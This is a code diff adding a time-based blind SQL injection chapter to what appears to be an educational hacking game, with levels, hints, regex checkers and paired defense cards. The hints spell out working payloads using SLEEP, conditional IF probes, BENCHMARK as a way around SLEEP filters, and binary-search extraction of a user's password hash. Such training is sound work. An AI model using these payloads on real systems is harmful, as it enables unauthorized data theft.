@@ -1370,7 +1370,195 @@ GRANT SELECT (id, username, name) ON users TO app_reader;  -- pw_hash excluded
       };
     },
   },
-  // Chapters 5 – 8 + NoSQL bonus still to author — see DESIGN.md §11 for continuation notes.
+  5: {
+    id: 5, name: 'Time-Based Blind', class: 'blind-time',
+    intro: 'No output, no error, no length difference. But latency? Latency tells.',
+    levels: {
+      1: {
+        id: '5.1', name: 'The Heartbeat',
+        endpoint: 'POST /track  (input: tracking_id)',
+        query: "SELECT 1 FROM events WHERE tracking_id='{u}'",
+        field: 'tracking_id',
+        goal: 'Confirm a time oracle: SLEEP makes the response observably slower.',
+        reconNotes: [
+          'Endpoint always returns the same 200 OK with empty body.',
+          "Append ' AND SLEEP(3) -- and watch the response time.",
+          '>3s response = injection confirmed.',
+        ],
+        hints: [
+          'SLEEP(3) on MySQL pauses the query for 3 seconds.',
+          "Payload:  ' AND SLEEP(3) --",
+          'On Postgres use pg_sleep(3); on MSSQL use WAITFOR DELAY \'0:0:3\'.',
+        ],
+        check(p) {
+          const ok = /(sleep\s*\(\s*\d+\s*\)|pg_sleep\s*\(\s*\d+\s*\)|waitfor\s+delay)/i.test(p) && /(--|\/\*|#)/.test(p);
+          return ok
+            ? { ok: true, narrate: 'Response landed in 3.4s. Time oracle confirmed.' }
+            : { ok: false, narrate: 'No latency change. Probe missing a delay function or comment.' };
+        },
+        unlockTokens: ['SLEEP(', 'pg_sleep(', 'WAITFOR DELAY'],
+        defense: {
+          title: 'Statement Timeouts + Parameters',
+          body: 'A short server-side query timeout (e.g., 1s) makes time oracles unreliable. Combined with parameters, the channel closes.',
+          code:
+`-- MySQL session timeout:
+SET SESSION MAX_EXECUTION_TIME = 1000;  -- 1s
+
+// At app layer:
+db.prepare("SELECT 1 FROM events WHERE tracking_id = ?").get(id);`,
+          tip: 'Timeouts mitigate; parameters fix.',
+        },
+      },
+      2: {
+        id: '5.2', name: 'Conditional Wait',
+        endpoint: 'POST /track',
+        query: "SELECT 1 FROM events WHERE tracking_id='{u}'",
+        field: 'tracking_id',
+        goal: 'Sleep only when a condition is true, so latency carries one bit.',
+        reconNotes: [
+          'IF(condition, SLEEP(3), 0) sleeps only when condition is true.',
+          "Probe: ' AND IF(1=1, SLEEP(3), 0) -- → slow.",
+          "Probe: ' AND IF(1=2, SLEEP(3), 0) -- → fast.",
+        ],
+        hints: [
+          'Conditional sleep encodes a bit per request.',
+          "Payload:  ' AND IF(1=1, SLEEP(3), 0) --",
+        ],
+        check(p) {
+          const ok = /if\s*\(.+,\s*sleep\s*\(\s*\d+\s*\)\s*,/i.test(p) || /case\s+when\s+.+then\s+pg_sleep/i.test(p);
+          return ok
+            ? { ok: true, narrate: 'Slow response confirms TRUE. Conditional latency is a clean oracle.' }
+            : { ok: false, narrate: 'Sleep is unconditional — that just stalls without giving information.' };
+        },
+        unlockTokens: ['IF(', 'CASE WHEN', 'THEN'],
+        defense: {
+          title: 'Same Story',
+          body: 'Time-based oracles are slower than boolean — but still feasible. Parameterize.',
+          code: `db.prepare("SELECT 1 FROM events WHERE tracking_id = ?").get(id);`,
+          tip: 'Time-based attacks scale poorly for the attacker — but they do scale. Don\'t underestimate.',
+        },
+      },
+      3: {
+        id: '5.3', name: 'The Slow Letter',
+        endpoint: 'POST /track',
+        query: "SELECT 1 FROM events WHERE tracking_id='{u}'",
+        field: 'tracking_id',
+        goal: 'Probe the first character of database() via a conditional sleep.',
+        reconNotes: [
+          'Combine ASCII(SUBSTRING(...)) with IF + SLEEP.',
+          'Insight roll improves the patience to wait through long sequences.',
+        ],
+        hints: [
+          'Wrap the boolean probe in IF(...).',
+          "Payload:  ' AND IF(ASCII(SUBSTRING(database(),1,1)) > 100, SLEEP(3), 0) --",
+        ],
+        check(p) {
+          const probe = /if\s*\(\s*ascii\s*\(\s*substring\s*\(.*database\s*\(\s*\).*,\s*1\s*,\s*1\s*\)\s*\)\s*(>|<|=)\s*\d+\s*,\s*sleep/i.test(p);
+          return probe
+            ? { ok: true, narrate: 'Slow → first char > \'d\'. Bisect from here.' }
+            : { ok: false, narrate: 'Conditional probe not shaped right.' };
+        },
+        unlockTokens: [],
+        defense: {
+          title: 'Defense in Depth Against Blind Channels',
+          body: 'Combine: parameters, statement timeouts, low DB-user privileges, anomaly detection on slow-query patterns.',
+          code: `// Layered. No single switch defeats blind injection — denial of channel does.`,
+          tip: 'Each layer eliminates a class of slow-query patterns.',
+        },
+      },
+      4: {
+        id: '5.4', name: 'Heavy Computation',
+        endpoint: 'POST /track',
+        query: "SELECT 1 FROM events WHERE tracking_id='{u}'",
+        field: 'tracking_id',
+        goal: 'Some environments block SLEEP. Use BENCHMARK with a heavy hash to stall instead.',
+        reconNotes: [
+          'BENCHMARK(N, expr) runs expr N times.',
+          'BENCHMARK(5000000, MD5(\'a\')) takes seconds — same oracle, different shape.',
+        ],
+        hints: [
+          'Replace SLEEP with BENCHMARK in the probe.',
+          "Payload:  ' AND IF(1=1, BENCHMARK(5000000, MD5('a')), 0) --",
+        ],
+        check(p) {
+          const ok = /benchmark\s*\(\s*\d+\s*,\s*md5\s*\(/i.test(p) && /if\s*\(/i.test(p);
+          return ok
+            ? { ok: true, narrate: 'Latency builds from CPU work, not SLEEP. Filter bypassed.' }
+            : { ok: false, narrate: 'BENCHMARK + MD5 missing.' };
+        },
+        unlockTokens: ['BENCHMARK('],
+        defense: {
+          title: 'Function Allowlisting Is Brittle',
+          body: 'Blocking SLEEP just shifts attackers to BENCHMARK / heavy regex / GENERATE_SERIES. Parameterize.',
+          code: `// Same fix.`,
+          tip: 'Every blocked function has 3 alternatives. Stop the injection.',
+        },
+      },
+      5: {
+        id: '5.5', name: 'The Patient Extraction',
+        endpoint: 'POST /track',
+        query: "SELECT 1 FROM events WHERE tracking_id='{u}'",
+        field: 'tracking_id',
+        goal: "Extract captain's pw_hash via timed binary-search probes.",
+        reconNotes: [
+          'Same shape as Boolean blind 4.5, but with conditional SLEEP for the oracle.',
+          'Slower per bit but works where output and length are identical.',
+        ],
+        hints: [
+          'Combine: SUBSTRING the hash, ASCII, comparator, IF + SLEEP.',
+          "Payload:  ' AND IF(ASCII(SUBSTRING((SELECT pw_hash FROM users WHERE username='captain'),1,1)) > 100, SLEEP(3), 0) --",
+        ],
+        check(p) {
+          const target = /pw_hash\s+from\s+users\s+where\s+username\s*=\s*['"]captain['"]/i.test(p);
+          const probe  = /if\s*\(\s*ascii\s*\(\s*substring\s*\(.*,\s*\d+\s*,\s*1\s*\)\s*\)\s*(>|<|=)\s*\d+\s*,\s*(sleep|pg_sleep|benchmark)/i.test(p);
+          return (target && probe)
+            ? { ok: true, narrate: 'Patience pays. The hash drips out, one slow second at a time.' }
+            : { ok: false, narrate: 'Probe or target missing.' };
+        },
+        unlockTokens: [],
+        defense: {
+          title: 'Statement Timeouts + Parameters + Least Privilege',
+          body: 'Three independent layers. A 1s timeout makes SLEEP(3) impossible regardless of injection.',
+          code:
+`SET SESSION MAX_EXECUTION_TIME = 1000;
+db.prepare("SELECT 1 FROM events WHERE tracking_id = ?").get(id);
+GRANT SELECT (id, username) ON users TO app_reader;  -- no pw_hash`,
+          tip: 'Even one of these alone breaks the attack.',
+        },
+      },
+    },
+    sandbox(seed) {
+      const rand = mulberry32(seed);
+      const dialects = ['MySQL', 'Postgres', 'MSSQL'];
+      const dialect = dialects[Math.floor(rand() * dialects.length)];
+      const fn = dialect === 'MySQL' ? 'SLEEP(n)' : dialect === 'Postgres' ? 'pg_sleep(n)' : "WAITFOR DELAY '0:0:n'";
+      return {
+        id: `5.S-${seed}`, name: `Sandbox: ${dialect} time oracle`,
+        endpoint: 'POST /track', query: "SELECT 1 FROM t WHERE x='{u}'", field: 'x',
+        goal: `Build a conditional ${fn} probe that asks one bit about database().`,
+        reconNotes: [
+          `Backend: ${dialect}.`,
+          `Available delay: ${fn}.`,
+          'Sandbox: cheatsheet definitions are visible.',
+        ],
+        hints: [],
+        check(p) {
+          const my  = /if\s*\(.*sleep\s*\(/i.test(p);
+          const pg  = /case\s+when\s+.+then\s+pg_sleep/i.test(p) || /pg_sleep/i.test(p);
+          const ms  = /if\s+.*waitfor\s+delay/i.test(p) || /waitfor\s+delay/i.test(p);
+          const oneBit = /(ascii|substring|>|<|=\s*\d+|database\s*\(\s*\))/i.test(p);
+          const dialectOk = (dialect === 'MySQL' && my) || (dialect === 'Postgres' && pg) || (dialect === 'MSSQL' && ms);
+          return (dialectOk && oneBit)
+            ? { ok: true, narrate: 'Latency oracle responds.' }
+            : { ok: false, narrate: 'Wrong dialect or no bit being probed.' };
+        },
+        unlockTokens: [],
+        defense: { title: 'Sandbox Cleared', body: 'Same defenses.', code: '// See cards.', tip: 'Re-roll.' },
+        sandbox: true,
+      };
+    },
+  },
+  // Chapters 6 – 8 + NoSQL bonus still to author — see DESIGN.md §11 for continuation notes.
 };
 
 const KNOWN_TOKENS = [
